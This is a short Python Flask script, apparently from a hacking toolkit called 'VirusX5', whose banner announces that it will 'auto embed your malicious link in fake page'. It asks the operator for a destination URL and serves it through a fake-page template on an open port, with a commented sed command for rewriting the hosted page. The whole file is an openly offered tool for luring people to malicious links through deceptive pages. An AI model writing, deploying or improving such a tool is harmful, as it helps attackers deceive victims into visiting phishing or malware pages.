#!/bin/python3
#Auto hosting Script

import os
import time
from flask import Flask, render_template

app = Flask(__name__)


#colours
pur='\033[35m'
cyan='\033[1;36m'
grn='\033[1;92m'
end='\033[0m'






#Credits

print(f"{grn}                  WELCOME HERE YOU CAN AUTO EMBED YOUR MALICIOUS LINK IN FAKE PAGE {end}")
time.sleep(1)
print(f'''               
                ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ██╗  ██╗███████╗
                ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗╚██╗██╔╝██╔════╝
                ███████║███████║██║     █████╔╝ █████╗  ██████╔╝ ╚███╔╝ ███████╗
                ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗ ██╔██╗ ╚════██║
                ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██╔╝ ██╗███████║
                ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                    ''')
print(f'''{grn}                                +-----------------------+
                                |Author| Zaeem Technical|
                                +-----------------------+{end}''')
print(f"{pur}STEPS TO BE FOLLOWED {end}")
print(f"{cyan}Auto host is not working always {end}")
print(f"{grn}USE manual host instead of Auto Setup {end}")
print()
print() 
time.sleep(2)

print(f"{grn}Enter Your Destination Link:-  {end}")
link =  input('\n\033[1;92m[\033[0m\033[1;77m*\033[0m\033[1;92m] Enter Whole URL: \033[0m')

os.system('cls')



@app.route('/')
def index():
    return render_template("index.html", url=str(link))

if __name__ == '__main__':
    app.run("0.0.0.0", port=8080)




""" cd $HOME/VirusX5/host/

sed -i s/http://www.zaeemtechnical.ml/$var/  $HOME/VirusX5/host/index.html """
